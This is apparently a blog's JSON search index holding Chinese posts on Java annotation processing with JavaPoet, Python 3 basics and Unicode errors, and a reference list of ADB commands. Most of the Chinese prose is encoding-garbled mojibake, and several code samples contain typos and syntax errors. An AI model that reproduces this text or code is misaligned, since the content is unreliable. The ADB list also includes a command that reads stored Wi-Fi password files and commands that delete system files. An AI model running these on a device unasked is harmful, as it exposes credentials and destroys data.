ç»§æ‰¿AbstractProcessorï¼Œå¿…é¡»è¦æœ‰ä¸€ä¸ªæ— å‚publicæ„é€ å‡½æ•° 3. ç”Ÿæˆæ–°çš„javaæ–¹æ³•é¦–å…ˆæ·»åŠ ä¾èµ–ï¼Œsquareçš„javaPoet å‡è®¾æƒ³ç”Ÿæˆçš„ä»£ç æ˜¯è¿™æ ·çš„ public final class UserBuilder{ private String userName; public UserBuilder username(String username){ this.username = username; returen this; } } ç”Ÿæˆå˜é‡ ç”Ÿæˆæ–¹æ³• ç”Ÿæˆclass: ç›´æ¥æˆªå›¾äº† ä¸»è¦æ­¥éª¤ meta_data ç”Ÿæˆprivate fieldå’Œpublic setter: FiledSpec username = FiledSpec.builder(String.class,â€usernameâ€,Modifier.PRIVATE).build(); ç”Ÿæˆbuild method ç”Ÿæˆbuilder å†™javaæ–‡ä»¶ï¼š 4. æ³¨æ„çš„åœ°æ–¹dnotâ€™t put annotation processors in a compile configuration, use the Android Apt pluginã€‚ if you using jack, jack has support for annotation processors. if itâ€™s only a java, could use the Gradle Apt Plugin æˆ‘ä»¬å†™çš„processorä¸ä¼šå¸¦åˆ°ç”Ÿæˆçš„apkä¸­ï¼Œä½†ç”Ÿæˆçš„ä»£ç ä¼šã€‚è¿™ä¹Ÿæ­£æ˜¯æƒ³è¦çš„ç›®çš„ã€‚ updatesInstagramçš„json parserä¹Ÿæ˜¯ä½¿ç”¨äº†annotationProcessoråœ¨ç¼–è¯‘æœŸç”Ÿæˆä»£ç  å¾ˆå¤šgsonè¿™æ ·çš„è§£æå™¨éƒ½ä½¿ç”¨äº†å¤§é‡çš„åå°„ï¼Œæ‰€ä»¥ç›¸æ¯”æ‰‹å†™çš„æ„é€ å‡½æ•°è¦æ…¢å¾ˆå¤šã€‚ ref android gradle plugin 2.3çš„å…¼å®¹é—®é¢˜ Androidæ²‰æ€å½• Droidcon NYC 2016 - @Eliminate(â€œBoilerplateâ€) Gradle Apt Plugin Andorid Apt Plugin","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"annotation","slug":"annotation","permalink":"https://haldir65.github.io/tags/annotation/"}]},{"title":"Python 3 å­¦ä¹ è®°å½•","date":"2016-12-24T22:06:37.000Z","path":"2016/12/24/2016-12-24-Python-UnicodeEncodeError/","text":"äººç”Ÿè‹¦çŸ­ï¼ŒPythonæ˜¯å²¸ 1. Pythonçš„ä¸€äº›ç¼ºç‚¹å¼•ç”¨å»–é›ªå³°çš„å®˜æ–¹ç½‘ç«™ä¸Šçš„è¯ï¼ŒPythonä¸€ä¸ªæ˜¯æ…¢ï¼Œä¸€ä¸ªæ˜¯ä»£ç ä¸èƒ½åŠ å¯† ç¬¬ä¸€ä¸ªç¼ºç‚¹å°±æ˜¯è¿è¡Œé€Ÿåº¦æ…¢ï¼Œå’ŒCç¨‹åºç›¸æ¯”éå¸¸æ…¢ï¼Œå› ä¸ºPythonæ˜¯è§£é‡Šå‹è¯­è¨€ï¼Œä½ çš„ä»£ç åœ¨æ‰§è¡Œæ—¶ä¼šä¸€è¡Œä¸€è¡Œåœ°ç¿»è¯‘æˆCPUèƒ½ç†è§£çš„æœºå™¨ç ï¼Œè¿™ä¸ªç¿»è¯‘è¿‡ç¨‹éå¸¸è€—æ—¶ï¼Œæ‰€ä»¥å¾ˆæ…¢ã€‚è€ŒCç¨‹åºæ˜¯è¿è¡Œå‰ç›´æ¥ç¼–è¯‘æˆCPUèƒ½æ‰§è¡Œçš„æœºå™¨ç ï¼Œæ‰€ä»¥éå¸¸å¿«ã€‚ ç¬¬äºŒä¸ªç¼ºç‚¹å°±æ˜¯ä»£ç ä¸èƒ½åŠ å¯† GILå¯¼è‡´çš„å¤šçº¿ç¨‹ä½æ•ˆç‡ ä»¥ä¸‹å†…å®¹å‡ºè‡ªé™è§… Â» Pythonçˆ¬è™«è¿›é˜¶äº”ä¹‹å¤šçº¿ç¨‹çš„ç”¨æ³• 1ã€GILæ˜¯ä»€ä¹ˆï¼Ÿ GILçš„å…¨ç§°æ˜¯Global Interpreter Lock(å…¨å±€è§£é‡Šå™¨é”)ï¼Œæ¥æºæ˜¯pythonè®¾è®¡ä¹‹åˆçš„è€ƒè™‘ï¼Œä¸ºäº†æ•°æ®å®‰å…¨æ‰€åšçš„å†³å®šã€‚ 2ã€æ¯ä¸ªCPUåœ¨åŒä¸€æ—¶é—´åªèƒ½æ‰§è¡Œä¸€ä¸ªçº¿ç¨‹ï¼ˆåœ¨å•æ ¸CPUä¸‹çš„å¤šçº¿ç¨‹å…¶å®éƒ½åªæ˜¯å¹¶å‘ï¼Œä¸æ˜¯å¹¶è¡Œï¼Œå¹¶å‘å’Œå¹¶è¡Œä»å®è§‚ä¸Šæ¥è®²éƒ½æ˜¯åŒæ—¶å¤„ç†å¤šè·¯è¯·æ±‚çš„æ¦‚å¿µã€‚ä½†å¹¶å‘å’Œå¹¶è¡Œåˆæœ‰åŒºåˆ«ï¼Œå¹¶è¡Œæ˜¯æŒ‡ä¸¤ä¸ªæˆ–è€…å¤šä¸ªäº‹ä»¶åœ¨åŒä¸€æ—¶åˆ»å‘ç”Ÿï¼›è€Œå¹¶å‘æ˜¯æŒ‡ä¸¤ä¸ªæˆ–å¤šä¸ªäº‹ä»¶åœ¨åŒä¸€æ—¶é—´é—´éš”å†…å‘ç”Ÿã€‚ï¼‰ åœ¨Pythonå¤šçº¿ç¨‹ä¸‹ï¼Œæ¯ä¸ªçº¿ç¨‹çš„æ‰§è¡Œæ–¹å¼ï¼š è·å–GIL æ‰§è¡Œä»£ç ç›´åˆ°sleepæˆ–è€…æ˜¯pythonè™šæ‹Ÿæœºå°†å…¶æŒ‚èµ·ã€‚ é‡Šæ”¾GIL å¯è§ï¼ŒæŸä¸ªçº¿ç¨‹æƒ³è¦æ‰§è¡Œï¼Œå¿…é¡»å…ˆæ‹¿åˆ°GILï¼Œæˆ‘ä»¬å¯ä»¥æŠŠGILçœ‹ä½œæ˜¯â€œé€šè¡Œè¯â€ï¼Œå¹¶ä¸”åœ¨ä¸€ä¸ªpythonè¿›ç¨‹ä¸­ï¼ŒGILåªæœ‰ä¸€ä¸ªã€‚æ‹¿ä¸åˆ°é€šè¡Œè¯çš„çº¿ç¨‹ï¼Œå°±ä¸å…è®¸è¿›å…¥CPUæ‰§è¡Œã€‚ åœ¨Python2.xé‡Œï¼ŒGILçš„é‡Šæ”¾é€»è¾‘æ˜¯å½“å‰çº¿ç¨‹é‡è§IOæ“ä½œæˆ–è€…ticksè®¡æ•°è¾¾åˆ°100ï¼ˆtickså¯ä»¥çœ‹ä½œæ˜¯Pythonè‡ªèº«çš„ä¸€ä¸ªè®¡æ•°å™¨ï¼Œä¸“é—¨åšç”¨äºGILï¼Œæ¯æ¬¡é‡Šæ”¾åå½’é›¶ï¼Œè¿™ä¸ªè®¡æ•°å¯ä»¥é€šè¿‡ sys.setcheckinterval æ¥è°ƒæ•´ï¼‰ï¼Œè¿›è¡Œé‡Šæ”¾ã€‚ è€Œæ¯æ¬¡é‡Šæ”¾GILé”ï¼Œçº¿ç¨‹è¿›è¡Œé”ç«äº‰ã€åˆ‡æ¢çº¿ç¨‹ï¼Œä¼šæ¶ˆè€—èµ„æºã€‚å¹¶ä¸”ç”±äºGILé”å­˜åœ¨ï¼Œpythoné‡Œä¸€ä¸ªè¿›ç¨‹æ°¸è¿œåªèƒ½åŒæ—¶æ‰§è¡Œä¸€ä¸ªçº¿ç¨‹(æ‹¿åˆ°GILçš„çº¿ç¨‹æ‰èƒ½æ‰§è¡Œ)ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆåœ¨å¤šæ ¸CPUä¸Šï¼Œpythonçš„å¤šçº¿ç¨‹æ•ˆç‡å¹¶ä¸é«˜ã€‚ 2. å®‰è£…packageå„ç§canâ€™t resolve XXXno module named urllib2 The urllib2 module has been split across several modules in Python 3 named urllib.request and urllib.error. The 2to3 tool will automatically adapt imports when converting your sources to Python 3. This is what look like on py 2.7 import urllib2 req = urllib2.Request(url,headers=header) html = urllib2.urlopen(req) html_data = html.read html_path = etree.HTML(html_data) on Python 3.X from urllib.request import urlopen from urllib.request import Request req = Request(img_url, headers=headers) urlhtml = urlopen(req) å¦‚æœæ˜¯è‡ªå·±å†™äº†ä¸€ä¸ª.pyæ–‡ä»¶ï¼Œè°ƒç”¨é‡Œé¢çš„å‡½æ•°,importçš„æ—¶å€™è¦æŠŠåŒ…è·¯å¾„å†™å®Œæ•´ 3. pip install XXXXå®‰è£…packageçš„æ–¹å¼ pip install xxxxâ€¦.å¾ˆå¤šåŒ…ä¼šå»ºè®®ä½ æ¥ä¸€ä¸ªpip install -U XXXè¿™ä¸ªUçš„æ„æ€æ˜¯upgrade if alreay install if not working 4. Listã€tupleã€dictã€setä»¥åŠåŸºæœ¬çš„æ•°æ®ç±»å‹ list mylist = [&#39;Tom&#39;,&#39;Jerry&#39;,&#39;Henry&#39;] mylist[0] = &#39;Tom&#39; tuple mytuple = (&#39;rock&#39;,&#39;pop&#39;,&#39;jazz&#39;) mytuple[0] = &#39;rock&#39; tupleåœ¨åˆå§‹åŒ–æ—¶å°±å·²ç»ç¡®å®šï¼Œä¸èƒ½ä¿®æ”¹ dict: d={&#39;name&#39;:&#39;tom&#39;,&#39;job&#39;:&#39;doctor&#39;,&#39;age&#39;,99} d[&#39;name&#39;] = &#39;tom&#39; set: s = set([1,2,3]) # éœ€è¦ä¼ å…¥ä¸€ä¸ªlistä½œä¸ºå‚æ•° &gt;&gt; s {1,2,3} setæ— åºï¼Œä¸å¯æœ‰é‡å¤å…ƒç´  setå’Œdictçš„åŒºåˆ«åœ¨äºå‰è€…æ²¡æœ‰å­˜å‚¨valueï¼Œä¸¤è€…å†…éƒ¨éƒ½ä¸èƒ½æœ‰é‡å¤å…ƒç´ (key) tupleç”¨çš„æ¯”è¾ƒå¤šï¼Œä¾‹å¦‚æœ‰å¤šä¸ªè¿”å›å€¼çš„å‡½æ•°ï¼ŒPythonå…¶å®è¿”å›äº†ä¸€ä¸ªTupleã€‚ ç±»ååº”è¯¥å†™æˆé©¼å³°æ ·å¼ï¼Œå˜é‡ååº”è¯¥å°å†™class name should be cammelCase, Arguments,variable name should be lowercase å¾ªç¯ for i in range(2, 5): print(i) &gt;&gt;&gt; result: 2 3 4 å·¦é—­å³å¼€ æ¡ä»¶åˆ¤æ–­ def add_end(L=None): if L is None: L = [] L.append(&#39;END&#39;) return L å‡½æ•°å‚æ•°ç›¸å…³ï¼Œå‡½æ•°ç»„åˆï¼ˆä¸€å…±äº”ç§ï¼‰ä½ç½®å‚æ•°ï¼Œé»˜è®¤å‚æ•°ï¼Œå¯å˜å‚æ•°ï¼Œå…³é”®å­—å‚æ•°ï¼Œå‘½åå…³é”®å­—å‚æ•° å®šä¹‰ä¸€ä¸ªå‡½æ•°å¯ä»¥å¸¦ä¸Šé»˜è®¤å€¼ï¼Œé»˜è®¤å€¼æ˜¯ä¸€ä¸ªå›ºå®šçš„å¯¹è±¡ï¼Œä¸Šæ¬¡æ“ä½œçš„å€¼ä¼šä¿ç•™åˆ°ä¸‹ä¸€æ¬¡è°ƒç”¨ def sell(name,price,amount=1): print(price*amount) sell(&#39;product&#39;,26) sell(&#39;product&#39;,26,2) &gt;&gt;&gt; 26 &gt;&gt;&gt; 52 é»˜è®¤å‚æ•°å‡½æ•° def power(x, n=2): #è¿™é‡Œçš„n=2å°±æ˜¯é»˜è®¤å‚æ•°ï¼Œæ³¨æ„ï¼Œé»˜è®¤å‚æ•°åº”è¯¥æ˜¯ä¸å¯å˜å¯¹è±¡,ä¾‹å¦‚strã€Noneè¿™ç§ s = 1 while n &gt; 0: n = n - 1 s = s * x return s power(5) &gt;&gt; 25 power(5,2) &gt;&gt;&gt;25 å¯å˜å‚æ•°å‡½æ•°# å®šä¹‰çš„æ—¶å€™åœ¨å‚æ•°å‰é¢åŠ ä¸€ä¸ª*å·å°±å¯ä»¥äº†ï¼Œå†…éƒ¨ä¼šé»˜è®¤ç»„è£…æˆä¸€ä¸ªtuple def calc(*numbers): #å‡½æ•°å†…éƒ¨æ¥æ”¶åˆ°çš„æ˜¯ä¸€ä¸ªtuple sum = 0 for n in numbers: sum = sum + n * n return sum calc(1,2) calc(2,3,5) nums = [1,2,3] cal(*nums)#æŠŠtupleå†…çš„å…ƒç´ ä½œä¸ºå‚æ•°ä¼ è¿›å» å…³é”®å­—å‚æ•° def person(name, age, **kw): print(&#39;name:&#39;, name, &#39;age:&#39;, age, &#39;other:&#39;, kw) &gt;&gt;&gt; person(&#39;Michael&#39;, 30) name: Michael age: 30 other: {} å†…éƒ¨è‡ªåŠ¨å°†å…³é”®å­—å‚æ•°è½¬æ¢æˆä¸€ä¸ªdict å‘½åå…³é”®å­—å‡½æ•° def shoppping(name,time,*,price,count)# priceå¯ä»¥æœ‰é»˜è®¤å€¼ print(price*count) &gt;&gt; shopping(john,0325,price=39,count=5) &gt;&gt; 195 5. çˆ¬è™«ç›¸å…³Chromeè‡ªå¸¦å¼€å‘è€…å·¥å…·ï¼Œå¯ä»¥æŸ¥çœ‹æ¯ä¸€ä¸ªrequestçš„headerï¼Œcookiesç­‰ä¿¡æ¯ã€‚æ¨¡æ‹Ÿæµè§ˆå™¨è¡Œä¸ºæ¯”è¾ƒæœ‰æ•ˆã€‚ctrl+shift+Rç¥å™¨ 5.1 Request, Urllib25.2 UnicodeEncodeError: â€˜asciiâ€™ codec canâ€™t encode characters in positionå°±ä¸­æ–‡æ¥è¯´ GB18030 ã€‹ GBK ã€‹ GB2312 # how to invoke this error b = &quot;this is english within ascii range&quot;.encode(&#39;ascii&#39;) # totally fine s = &quot;ä½ å¥½&quot;.encode(&#39;ascii&#39;) # this will raise an error ,UnicodeEncodeError: &#39;ascii&#39; codec can&#39;t encode characters in position 0-1: ordinal not in range(128)&gt; print((b&quot;totally cool binary representation of english words within ascii range&quot;).decode(&#39;ascii&#39;)) print((b&quot;totally cool binary cause utf-8 include ascii&quot;).decode(&#39;utf-8&#39;)) # å®Œå…¨æ­£å¸¸ # eg. string = &quot;ä½ å¥½å•Š&quot; binary_string = b&#39;\\xe4\\xbd\\xa0\\xe5\\xa5\\xbd\\xe5\\x95\\x8a&#39; binary_string_2_string = bstring.decode(&#39;utf-8&#39;) code : print(string) print(string.encode(&#39;utf-8&#39;)) print(bstring2string) print(which_instance_is_this(string)) print(which_instance_is_this(bstring)) print(which_instance_is_this(bstring2string)) outputs: ä½ å¥½å•Š b&#39;\\xe4\\xbd\\xa0\\xe5\\xa5\\xbd\\xe5\\x95\\x8a&#39; ä½ å¥½å•Š is str is byte is str **Since Python 3.0, the language features a str type that contain Unicode characters, meaning any string created using &quot;unicode rocks!&quot;, &#39;unicode rocks!&#39;, or the triple-quoted string syntax is stored as Unicode.** å†’å·é‡Œé¢çš„éƒ½æ˜¯strï¼Œéƒ½æ˜¯unicodeçš„é›†åˆã€‚ç”Ÿæˆunicodeå¯ä»¥ç”¨chr(12345) ï¼Œè¯¥æ–¹æ³•æ¥å—ä¸€ä¸ªintegerè¿”å›ä¸€ä¸ªé•¿åº¦ä¸º1çš„Unicode Stringã€‚ åè¿‡æ¥å¯ä»¥ç”¨ord(ä½ ) ç”Ÿæˆâ€œä½ â€è¿™ä¸ªå­—åœ¨unicodeä¸­çš„ç¼–å· print(chr(20320)) &gt;&gt;&gt;&gt; ä½  print(ord(&#39;ä½ &#39;)) &gt;&gt;&gt;&gt; 20320 #è¿™é‡Œåªèƒ½ç”¨é•¿åº¦ä¸º1çš„string binary to string is called decode ,string to binary is encode bytes.decode(&#39;utf-8&#39;) &lt;----&gt; str.encode(&#39;utf-8&#39;) å›åˆ°UnicodeEncodeError: &#39;ascii&#39; codec can&#39;t encode characters in position str.encode(&#39;ascii&#39;)ï¼Œunicodeå­—ç¬¦è¶…å‡ºäº†asciiçš„èŒƒå›´ï¼Œæ— æ³•decodeæˆbinary 6.ä¸€äº›ç»†èŠ‚æ–‡ä»¶è¯»å†™çš„å„ç§æ¨¡å¼ä»¥åŠè§£ç é—®é¢˜ with open(filepath, &#39;r&#39;, encoding=&quot;utf8&quot;) as f: f.write(&#39;æœ€å¥½ç”¨utf8è¯»å’Œå†™æ–‡ä»¶&#39;) #å·²ç»è‡ªåŠ¨åšå¥½closeæ–‡ä»¶çš„å·¥ä½œ how to upgrade installed packages? pip install â€“upgrade setuptools è¿­ä»£ä¸€ä¸ªå­—å…¸ï¼Œå¹¶æ‰“å°å‡ºkey,vaule for key,value in d.items(): # è¿™ä¸ªitemså‡½æ•°å…¶å®æ˜¯å­—å…¸è‡ªå¸¦çš„å‡½æ•° print(&#39;%s key has the value %s&#39;%(key,value)) #ç¬¬ä¸‰ä¸ªç™¾åˆ†å·æ˜¯ç”¨æ¥æŠŠkeyå¡«åˆ°ç¬¬ä¸€ä¸ªç™¾åˆ†å·åï¼ŒæŠŠvalueå¡«åˆ°ç¬¬äºŒä¸ªç™¾åˆ†å·åé¢çš„ # ç”¨æ™®é€šçš„for i æ–¹å¼è¿­ä»£ä¸€ä¸ªå­—å…¸ï¼Œè¿­ä»£å‡ºæ¥çš„æ˜¯ä¸€ä¸ªä¸ªçš„keyï¼Œå¯ä»¥ç”¨dict[key]æŠŠvalueæå‡ºæ¥ 7. åœ¨PyCharmä¸­ä½¿ç”¨virtualenvvirtualenvä¸€èˆ¬éƒ½æ˜¯åœ¨å‘½ä»¤è¡Œé‡Œé¢åˆ›å»ºï¼ŒPyCharmé‡Œé¢ï¼Œsetting-project-project Interpreter é‚£ä¸ªé€‰æ‹©çš„ç®­å¤´å³è¾¹æœ‰ä¸€ä¸ªé½¿è½®ï¼Œç›´æ¥åˆ›å»ºä¸€ä¸ªæ–°çš„å°±å¥½äº†ã€‚virtualenvçš„å¥½å¤„æ˜¯ä¸ä¼šå¹²æ‰°æœºå™¨ä¸Šå·²å®‰è£…çš„packageï¼Œæœ‰äº›åŒ…ç°åœ¨è¿˜åªèƒ½åœ¨2.7ä¸‹è¿è¡Œï¼Œå¦‚flask_mailã€‚ç”¨å®Œä¹‹åï¼Œide cmdè¾“å…¥ deactivateå³å¯é€€å‡ºvirtualenvã€‚ Kenneth Reitz - Pipenv: The Future of Python Dependency Management - PyCon 2018 PipEnvå–ä»£virtualenv 8.åœ¨linuxç¯å¢ƒä¸­è¿è¡ŒPythonåŠè°ƒç”¨ç³»ç»ŸAPIè®¡ç®—å½“å‰ç³»ç»Ÿç£ç›˜ç©ºé—´å ç”¨ç‡æ¨èä½¿ç”¨os.subprocessæ¨¡å—è°ƒç”¨shell 9. futureæ¨¡å—æ˜¯ä¸ºäº†åœ¨2.7ä¸­ä½¿ç”¨3çš„åŠŸèƒ½from __future__ import division print &#39;10 / 3 =&#39;, 10 / 3 print &#39;10.0 / 3 =&#39;, 10.0 / 3 print &#39;10 // 3 =&#39;, 10 // 3 ç›´æ¥åœ¨2.7ä¸­ä½¿ç”¨3çš„é™¤æ³•ï¼ˆ2.7ä¸­çš„é™¤æ³•æ˜¯10/3=3ï¼Œ3ä¸­çš„é™¤æ³•æ˜¯10/3=3.33333â€¦ï¼‰ å‚è€ƒ real python å»–é›ªå³°çš„å®˜æ–¹ç½‘ç«™ é™è§… unicodeencodeerror-ascii-codec-cant-encode-character Droidcon NYC 2016 - Decoding the Secrets of Binary Data Jake Wharton and Jesse Wilson - Death, Taxes, and HTTP Droidcon Montreal Jake Wharton - A Few Ok Libraries Jesse Wilson - Coordinating Space and Timeseleniumæ•™ç¨‹æ·±å¤åˆ¶å’Œæµ…å¤åˆ¶çš„åŒºåˆ«å¦‚ä½•ä½¿ç”¨å…¨å±€å˜é‡, global variables are dangerous","tags":[{"name":"python","slug":"python","permalink":"https://haldir65.github.io/tags/python/"}]},{"title":"adbå¸¸ç”¨å‘½ä»¤æ‰‹å†Œ","date":"2016-12-10T21:14:14.000Z","path":"2016/12/10/2016-12-10-adb-command/","text":"ADB å¸¸ç”¨å‘½ä»¤æ‰‹å†Œå¹³æ—¶åœ¨android studioä¸­ç”¨commandçš„æ—¶å€™è¿˜æœ‰ç‚¹ä¸ç†Ÿæ‚‰ï¼Œæ‰¾åˆ°ä¸€ç¯‡åšå®¢ï¼Œè®°å½•ä¸‹æ¥ï¼Œä½œä¸ºæ—¥å¸¸å‚è€ƒã€‚å¸Œæœ›åæœŸèƒ½å¤Ÿæœ‰æ—¶é—´æŠŠGoogle IOä¸Šæ·»åŠ çš„ä¸€äº›å‘½ä»¤åŠ ä¸Šæ¥ è·å–åºåˆ—å·ï¼š adb get-serialno æŸ¥çœ‹è¿æ¥è®¡ç®—æœºçš„è®¾å¤‡ï¼š adb devices é‡å¯æœºå™¨ï¼š adb reboot é‡å¯åˆ°bootloaderï¼Œå³åˆ·æœºæ¨¡å¼ï¼š adb reboot bootloader é‡å¯åˆ°recoveryï¼Œå³æ¢å¤æ¨¡å¼ï¼š adb reboot recovery æŸ¥çœ‹logï¼š adb logcat ç»ˆæ­¢adbæœåŠ¡è¿›ç¨‹ï¼š adb kill-server é‡å¯adbæœåŠ¡è¿›ç¨‹ï¼š adb start-server è·å–æœºå™¨MACåœ°å€ï¼š adb shell cat /sys/class/net/wlan0/address è·å–CPUåºåˆ—å·ï¼š adb shell cat /proc/cpuinfo å®‰è£…APKï¼š adb install //æ¯”å¦‚ï¼šadb install baidu.apk ä¿ç•™æ•°æ®å’Œç¼“å­˜æ–‡ä»¶ï¼Œé‡æ–°å®‰è£…apkï¼š adb install -r //æ¯”å¦‚ï¼šadb install -r baidu.apk å®‰è£…apkåˆ°sdå¡ï¼š adb install -s // æ¯”å¦‚ï¼šadb install -s baidu.apk å¸è½½APKï¼š adb uninstall //æ¯”å¦‚ï¼šadb uninstall com.baidu.search å¸è½½appä½†ä¿ç•™æ•°æ®å’Œç¼“å­˜æ–‡ä»¶ï¼š adb uninstall -k //æ¯”å¦‚ï¼šadb uninstall -k com.baidu.search å¯åŠ¨åº”ç”¨ï¼š adb shell am start -n &lt;package_name&gt;/.&lt;activity_class_name&gt; æŸ¥çœ‹è®¾å¤‡cpuå’Œå†…å­˜å ç”¨æƒ…å†µï¼š adb shell top æŸ¥çœ‹å ç”¨å†…å­˜å‰6çš„appï¼š adb shell top -m 6 åˆ·æ–°ä¸€æ¬¡å†…å­˜ä¿¡æ¯ï¼Œç„¶åè¿”å›ï¼š adb shell top -n 1 æŸ¥è¯¢å„è¿›ç¨‹å†…å­˜ä½¿ç”¨æƒ…å†µï¼š adb shell procrank æ€æ­»ä¸€ä¸ªè¿›ç¨‹ï¼š adb shell kill [pid] æŸ¥çœ‹è¿›ç¨‹åˆ—è¡¨ï¼š adb shell ps æŸ¥çœ‹æŒ‡å®šè¿›ç¨‹çŠ¶æ€ï¼š adb shell ps -x [PID] æŸ¥çœ‹åå°servicesä¿¡æ¯ï¼š adb shell service list æŸ¥çœ‹å½“å‰å†…å­˜å ç”¨ï¼š adb shell cat /proc/meminfo æŸ¥çœ‹IOå†…å­˜åˆ†åŒºï¼š adb shell cat /proc/iomem å°†systemåˆ†åŒºé‡æ–°æŒ‚è½½ä¸ºå¯è¯»å†™åˆ†åŒºï¼š adb remount ä»æœ¬åœ°å¤åˆ¶æ–‡ä»¶åˆ°è®¾å¤‡ï¼š adb push ä»è®¾å¤‡å¤åˆ¶æ–‡ä»¶åˆ°æœ¬åœ°ï¼š adb pull åˆ—å‡ºç›®å½•ä¸‹çš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ï¼Œç­‰åŒäºdosä¸­çš„dirå‘½ä»¤ï¼š adb shell ls è¿›å…¥æ–‡ä»¶å¤¹ï¼Œç­‰åŒäºdosä¸­çš„cd å‘½ä»¤ï¼š adb shell cd é‡å‘½åæ–‡ä»¶ï¼š adb shell rename path/oldfilename path/newfilename åˆ é™¤system/avi.apkï¼š adb shell rm /system/avi.apk åˆ é™¤æ–‡ä»¶å¤¹åŠå…¶ä¸‹é¢æ‰€æœ‰æ–‡ä»¶ï¼š adb shell rm -r ç§»åŠ¨æ–‡ä»¶ï¼š adb shell mv path/file newpath/file è®¾ç½®æ–‡ä»¶æƒé™ï¼š adb shell chmod 777 /system/fonts/DroidSansFallback.ttf æ–°å»ºæ–‡ä»¶å¤¹ï¼š adb shell mkdir path/foldelname æŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼š adb shell cat æŸ¥çœ‹wifiå¯†ç ï¼š adb shell cat /data/misc/wifi/*.conf æ¸…é™¤logç¼“å­˜ï¼š adb logcat -c æŸ¥çœ‹bugæŠ¥å‘Šï¼š adb bugreport è·å–è®¾å¤‡åç§°ï¼š adb shell cat /system/build.prop æŸ¥çœ‹ADBå¸®åŠ©ï¼š adb help è·‘monkeyï¼š adb shell monkey -v -p your.package.name 500 å½•åˆ¶è§†é¢‘ adb shell screenrecord /sdcard/demo.mp4 ç”Ÿæˆçš„Demo.mp4æ–‡ä»¶åœ¨æ ¹ç›®å½•ä¸‹é¢ï¼Œé»˜è®¤å½•åˆ¶æ—¶é•¿180sæŒ‰ä¸‹ctrl+c åœæ­¢å½•åˆ¶æ³¨æ„ï¼Œæœ€å¥½åœ¨å¼€å‘è€…é€‰é¡¹é‡Œé¢ï¼ŒæŠŠæ˜¾ç¤ºè§¦æ‘¸æ“ä½œæ‰“å¼€ï¼Œè¿™æ ·è§†é¢‘ä¸­èƒ½æ˜¾ç¤ºç”¨æˆ·ç‚¹å‡»æ“ä½œä½ç½® ADBæ— çº¿è°ƒè¯• $adb tcpip 5555$ adb connect &lt;\\device-ip-address&gt;$ adb devicesdone ANRçš„æ—¥å¿—æ”¾åœ¨/data/anr/traces.txté‡Œé¢./adb pull path_to_file location_to_saveå°±èƒ½æå‡ºæ¥äº† $ adb shell ps | grep bbk ## åœ¨ä¸€å°æ­¥æ­¥é«˜æ‰‹æœºä¸Šu0_a24 11843 730 1808812 61012 SyS_epoll_ 0000000000 S com.bbk.appstoresystem 13140 730 1773144 51608 SyS_epoll_ 0000000000 S com.bbk.facewakeu0_a80 13464 730 1772072 46280 SyS_epoll_ 0000000000 S com.bbk.calendar $ adb shell cat /proc/11843/oom_adj/system/bin/sh: cat: /proc/11843/oom_adj: Permission denied LowMemory Killerå®ç°æœç´¢å…³é”®å­—(oom_adj) adb suè¿›terminalæ‰¾ä¸€å°rootäº†çš„æ‰‹æœºadb shellsu//å¥½äº†ï¼Œç°åœ¨å¯ä»¥è¿›rootæ¨¡å¼äº†pm list packagespm clear PACKAGE //åˆ æ‰/data/data/packageé‡Œé¢çš„ä¸œè¥¿//å¯ç”¨/ç¦ç”¨appæˆ–è€…ç»„ä»¶,éœ€è¦suæ‰§è¡Œpm enable [â€“user USER_ID] PACKAGE_OR_COMPONENTpm disable [â€“user USER_ID] PACKAGE_OR_COMPONENTpm reset //é‡ç½®æ‰€æœ‰åº”ç”¨çš„æƒé™ è¿™é‡Œé¢å°±æœ‰å¾ˆå¤šå¯ä»¥åšçš„äº† am stack listam start -n com.huxiu/com.huxiu.ui.activity.SplashActivity //å‘½ä»¤è¡Œå¯åŠ¨æŸåº”ç”¨am start -n com.android.browser/com.android.browser.BrowserActivity //å‘½ä»¤è¡Œå¼€æµè§ˆå™¨ adb devices -læŸ¥çœ‹è®¾å¤‡ä¿¡æ¯ï¼›é€šè¿‡adb shell getprop | grep productæŸ¥çœ‹è®¾å¤‡ä¿¡æ¯ï¼šæ›´è¯¦ç»†çš„ä¿¡æ¯å¯ä»¥ä½¿ç”¨adb shell getpropæŸ¥çœ‹å…¨éƒ¨ä¿¡æ¯ã€‚ å¯¼å…¥å’Œå¯¼å‡ºæ–‡ä»¶å¯¼å…¥ï¼šadb push xxx/xxx /sdcard/xxxå¯¼å‡ºï¼šadb pull /sdcard/xxx /xxx/xxx è·å–å½“å‰è¿è¡Œçš„Activityadb shell dumpsys activity | grep â€œRun #â€ æŸ¥çœ‹cpuä½ç‰ˆæœ¬Android(Android NåŠä¹‹å‰)ï¼šadb shell top -n 1 | sed -n â€˜4,17pâ€™é«˜ç‰ˆæœ¬ANdroid(Android OåŠä¹‹å)ï¼šadb shell top -n 1 | sed -n â€˜5,15pâ€™ æŸ¥çœ‹å†…å­˜ä¿¡æ¯adb shell dumpsys meminfo com.package æŸ¥çœ‹æŸä¸ªåº”ç”¨çš„è€—ç”µçŠ¶å†µä»android 5.0å¼€å§‹ï¼Œå¯ä»¥é€šè¿‡adb shell dumpsys batterystats com.packageè·å–ç”µé‡çš„ç›¸å…³ä¿¡æ¯ã€‚ æ¸…é™¤åº”ç”¨çš„æ•°æ®å’Œç¼“å­˜adb shell pm clear com.package æ¨¡æ‹Ÿinputäº‹ä»¶adb shell input keyevent key_codeä¾‹å¦‚ï¼šadb shell input keyevnet 3 # ç‚¹å‡»homeé”®æ“ä½œ adb shell input keyevent 4 # ç‚¹å‡»è¿”å›é”®æ“ä½œ adb shell input keyevent 8 # for key â€˜1â€™ adb shell input keyevent 29 # for key â€˜Aâ€™ adb shell input text â€œhelloâ€ # å‘é€æ–‡æœ¬â€œhelloâ€ react native shake emulator , will start debug menuadb shell input keyevent 82 æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬ï¼šadb shell getprop ro.build.version.release æŸ¥çœ‹ç³»ç»Ÿapiç‰ˆæœ¬ï¼šadb shell getprop ro.build.version.sdk æŸ¥çœ‹æ‰‹æœºIPåœ°å€ï¼šadb shell ifconfig | grep â€˜inet addr:â€™ | sed -n â€˜2pâ€™ | awk â€˜{print $2}â€™ | cut -d â€˜:â€™ -f 2 å‚è€ƒ: å¼ æ˜äº‘çš„åšå®¢ adbæ— 